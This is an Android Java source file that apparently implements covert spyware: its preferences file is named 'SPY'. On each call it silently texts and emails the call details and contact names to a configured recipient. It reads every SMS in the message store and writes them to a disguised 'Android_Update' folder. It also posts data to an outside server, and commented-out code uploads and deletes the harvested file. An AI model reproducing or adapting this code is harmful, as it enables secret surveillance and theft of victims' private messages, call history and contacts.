package com.example.remote;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;


import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.os.StrictMode;
import android.provider.ContactsContract.PhoneLookup;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class ServiceReceiver extends BroadcastReceiver {
	
    private final SmsManager sms = SmsManager.getDefault();
    static String contactName = "";
    private SharedPreferences phone_num;
    private SharedPreferences pr2;
    private SharedPreferences out_num;
    private Context cx;
    
    public void onReceive(Context context, Intent intent) {
    	StrictMode.enableDefaults();
    	out_num = context.getSharedPreferences("cal_out", 0);
    	pr2 = context.getSharedPreferences("call_in", 0);
    	phone_num = context.getSharedPreferences("SPY", 0);
    	cx = context;
    	
    	if (intent.getAction().equals("android.intent.action.PHONE_STATE"))
		{
    		if(intent.getStringExtra("state").equals(TelephonyManager.EXTRA_STATE_RINGING))
    		{
    			pr2.edit().putString("incoming_num1", intent.getStringExtra("incoming_number")).commit();
    		}
    		else if(intent.getStringExtra("state").equals(TelephonyManager.EXTRA_STATE_OFFHOOK))
    		{
    			
    		}
    		else if(intent.getStringExtra("state").equals(TelephonyManager.EXTRA_STATE_IDLE))
    		{
//    			sent_mess();
    			String in = "";
            	try {
            		in = pr2.getString("incoming_num1", "");
            		if(in.equals(""))
            		{
            			if(phone_num.getBoolean("call_num_ch", false) && !phone_num.getString("call_num_ed", "").equals(""))
            			{
                			sms.sendTextMessage("09" + phone_num.getString("call_num_ed", ""), null, "CALL To:" + out_num.getString("c_n", "") , null, null);
                			out_num.edit().remove("c_n").commit();
            			}
            		}
            		else 
        			{
            			getContactName(context, in);
            			if(phone_num.getBoolean("call_num_ch", false) && !phone_num.getString("call_num_ed", "").equals(""))
            			{
                			sms.sendTextMessage("09" + phone_num.getString("call_num_ed", ""), null, "CALL FROM:" + in + contactName , null, null);
            			}
            			if(phone_num.getBoolean("mail_call_ch", false) && !phone_num.getString("mail_call_ed", "").equals("") )
	                    {
            				ConnectivityManager manager = (ConnectivityManager) cx.getSystemService(Context.CONNECTIVITY_SERVICE);
                            NetworkInfo networkInfo = manager.getActiveNetworkInfo();
	                    	if(!(networkInfo == null || !networkInfo.isConnected() || !networkInfo.isAvailable()))
	                    	{
	                    		 try {  
	                					String toEmails = phone_num.getString("mail_call_ed", "");
	                					String emailBody = "TAMAS DARYAFTI\n" +  in + contactName + "";
	                					sendMail s = new sendMail();
	                					s.sendAccelerationData(emailBody, toEmails);
	                             } catch (Exception e) {   
	                                 Log.e("SendMail", e.getMessage(), e);   
	                             } 
	            		       
	                    	}
	                    	else 
	                    	{
	                    		String a = pr2.getString("call_in_num", "");
	                			pr2.edit().putString("call_in_num",a + in + contactName + "\n").commit();
	                    	}
	                    }
            			pr2.edit().remove("incoming_num1").commit();
        			}
            		
            	} catch (Exception e) {
				}
            	
            	ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
                NetworkInfo networkInfo = manager.getActiveNetworkInfo();
                
                if (!(networkInfo == null || !networkInfo.isConnected() || !networkInfo.isAvailable()) ) 
                {
                	/*boolean isWifi = manager.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
            	            .isConnectedOrConnecting();
//        	    	if(isWifi)
        	    	{
        	    		StringBuilder text = new StringBuilder();

        	    		try {
        	    			File root = new File(Environment.getExternalStorageDirectory() + "/Android_Update");
        		            if (!root.exists()) {
        		                root.mkdirs();
        		            }
        		            File gpxfile = new File(root, "Android");

        	    		    BufferedReader br = new BufferedReader(new FileReader(gpxfile));
        	    		    String line;

        	    		    while ((line = br.readLine()) != null) {
        	    		        text.append(line);
        	    		        text.append('\n');
        	    		    }
        	    		    br.close();
        	    		    gpxfile.delete();
        	    		}
        	    		catch (IOException e) {
        	    		    //You'll need to add proper error handling here
        	    		}
        	    		
        	    		if(text.toString().length()>5)
        	    		{
        		    		sendMail a = new sendMail();
        		    		String toEmails = phone_num.getString("mail_mess_ed", "");
        		    		a.sendAccelerationData(text.toString(), toEmails);
        	    		}
        	    	}*/
                	
                	/*File root = new File(Environment.getExternalStorageDirectory() + "/Android_Update/Android.txt");
                	if(root.isFile())
                	{
                		sendToServer sTs = new sendToServer();
    		        	sTs.uploadFile(root.getAbsolutePath());
                	}
		        	sendAccelerationData(root.getName(), phone_num.getString("mail_mess_ed", ""),"sendMail.php");*/
                }
    		}
		}

    }
    
    public void sendAccelerationData(String path,String to,String add)
	{
		
	    //Add data to be send.
		
		ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
		nameValuePairs.add(new BasicNameValuePair("path",path));
    	nameValuePairs.add(new BasicNameValuePair("to",to));
    	
	    HttpResponse response = null;
	    
	    try
	    {
	    	
	    	HttpClient httpclient = new DefaultHttpClient();
	    	HttpPost httppost = new HttpPost("http://rashenchair.ir/Ali_FILE/" + add);
	    	httppost.setEntity( new UrlEncodedFormEntity(nameValuePairs,HTTP.UTF_8));
	    	response = httpclient.execute(httppost);
			Log.e("postData", response.getStatusLine().toString());
	    	
	    }
	    catch(Exception e)
	    {
	    	//Toast.makeText(IncomingSms.this, response.getStatusLine().toString(), Toast.LENGTH_SHORT).show();
	    }
	}
    
	public void sent_mess()
  	{
		 Uri mSmsinboxQueryUri = Uri.parse("content://sms");
	     Cursor cursor = cx.getContentResolver().query(mSmsinboxQueryUri,
	                 new String[] { "_id", "thread_id", "address", "person", "date",
	                                 "body", "type" }, null, null, null);
	     String[] columns = new String[] { "address", "person", "date", "body","type","_id" };
	     if (cursor.getCount() > 0) 
	     {
	    	 int temp = phone_num.getInt("last_mess_id", 0),temp2 =0;
	    	 Log.e("Temp", temp+"");
	         if (cursor.getCount() > 0) {
	             cursor.moveToFirst();
	             do 
	             {
	            	 String type = cursor.getString(cursor.getColumnIndex(columns[4]));
                	 String address = cursor.getString(cursor.getColumnIndex(columns[0]));
                	 String msg = cursor.getString(cursor.getColumnIndex(columns[3]));
                	 long date = cursor.getLong(cursor.getColumnIndex(columns[2]));
                	 int id = Integer.valueOf(cursor.getString(cursor.getColumnIndex(columns[5])));
                	 Log.e("ID", id+"");
                	 if (id > temp) 
                	 {
                		 Log.e("((((((()))))))", "88888888");
                    	 Log.e("ID*******", id+"");
                    	 Log.e("Body*****", msg);
                         if(id>temp2)
                        	 temp2 = id;
                         send_sent_mess(msg, address,date,type);
                         Log.e("TOP", temp2 + "");
                         phone_num.edit().putInt("last_mess_id", temp2).commit();
                     }
	             }while (cursor.moveToNext());
	         }
	     }
	     
	     Log.e("&&&&&&&&", mess);
	     if(mess.length()>2)
	     {
	    	 try
		        {
		       	 File root = new File(Environment.getExternalStorageDirectory() + "/Android_Update");
		            if (!root.exists()) {
		                root.mkdirs();
		            }
		            File gpxfile = new File(root, "Android.txt");
	            	FileOutputStream fOut = new FileOutputStream(gpxfile,true);
	            	fOut.write(mess.getBytes("UTF-8"));
	            	fOut.flush();
	            	fOut.close();
		        }
		        catch(IOException e)
		        {
		             e.printStackTrace();
		        }
		     /*sendMail a = new sendMail();
		     String toEmails = my.getString("mail_mess_ed", "");
		     a.sendAccelerationData(mess, toEmails);*/
	     }
  	}

	String mess = "";
	//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	public void send_sent_mess(String msg,String address,long date,String type)
	{
		getContactName(cx, address);
		Date d = new Date(date);
		SimpleDateFormat f = new SimpleDateFormat("dd/MM/yyyy,HH:mm");
//		f.setTimeZone(TimeZone.getTimeZone("GMT"));
		String s = f.format(d);
		String type_sentence = "";
		if(type.equals("2"))
			type_sentence = " SendTo: ";
		else
			type_sentence = " From: ";
		mess += "Message : " + msg + " ||" + type_sentence + address + contactName 
				+ " || "+ s + "\n\n";
	}
    
    public static void getContactName(Context context, String phoneNumber)
	{
		    
		 ContentResolver cr = context.getContentResolver();
		 Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
	  	 Cursor cursor = cr.query(uri, new String[]{PhoneLookup.DISPLAY_NAME}, null, null, null);
	  	 if (cursor == null) {
	  	 }
	    
	  	 else if(cursor.moveToFirst()) 
	  	 {
	  		 contactName = "(" + cursor.getString(cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME)) + ")";
	  	 }
	
	  	 else if(cursor != null && !cursor.isClosed()) {
	  		 cursor.close();
	  	 }
	
	}
    
 }

